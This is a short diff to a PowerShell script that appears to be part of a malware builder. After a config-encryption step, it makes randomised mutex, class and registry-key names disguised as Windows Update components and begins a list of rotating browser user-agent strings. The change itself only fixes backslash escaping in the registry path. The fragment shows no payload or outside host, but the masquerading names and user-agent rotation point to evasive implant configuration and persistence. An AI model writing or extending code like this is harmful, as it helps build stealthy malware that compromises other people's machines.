@@ -7,7 +7,7 @@ if (!$?) { Write-Output "Config encryption failed"; exit 1 }
 $randSuffix = (Get-Random -Minimum 100000 -Maximum 999999).ToString()
 $mtxVal = "WUClient_$randSuffix"
 $clsVal = "WUFilter_$randSuffix"
-$regVal = "Software\Microsoft\Windows\CurrentVersion\WUSvc_$randSuffix"
+$regVal = "Software\\Microsoft\\Windows\\CurrentVersion\\WUSvc_$randSuffix"
 $uaList = @(
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
